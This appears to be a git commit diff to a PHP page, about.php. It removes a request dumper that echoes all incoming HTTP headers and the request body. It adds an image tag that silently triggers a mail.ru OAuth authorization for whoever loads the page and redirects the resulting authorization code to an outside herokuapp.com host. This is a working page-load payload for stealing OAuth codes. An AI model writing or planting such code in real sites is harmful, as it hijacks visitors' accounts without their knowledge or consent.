b34849f0b35f1353ec0b1f1a4843b5e6b75d8587
dinar92 <gdinar92@gmail.com>
2021-02-23 00:25:57 +0300

    Image code

--- about.php
+++ about.php
@@ -1,20 +1,6 @@
  
 <?php
 
-print("<html><title>Title</title><body><img src='./bat.jpg'/></body></html>");
-foreach ($_SERVER as $key => $value) {
-    if (strpos($key, 'HTTP_') === 0) {
-        $chunks = explode('_', $key);
-        $header = '';
-        for ($i = 1; $y = sizeof($chunks) - 1, $i < $y; $i++) {
-            $header .= ucfirst(strtolower($chunks[$i])).'-';
-        }
-        $header .= ucfirst(strtolower($chunks[$i])).': '.$value;
-        echo $header."\n";
-    }
-}
-$body = file_get_contents('php://input');
-if ($body != '') {
-  print("\n$body\n\n");
-}
+print("<html><title>Title</title><body><img src='https://connect.mail.ru/oauth/authorize?client_id=783359&response_type=code&redirect_uri=https://afternoon-depths-59391.herokuapp.com/'/></body></html>");
+
 ?>
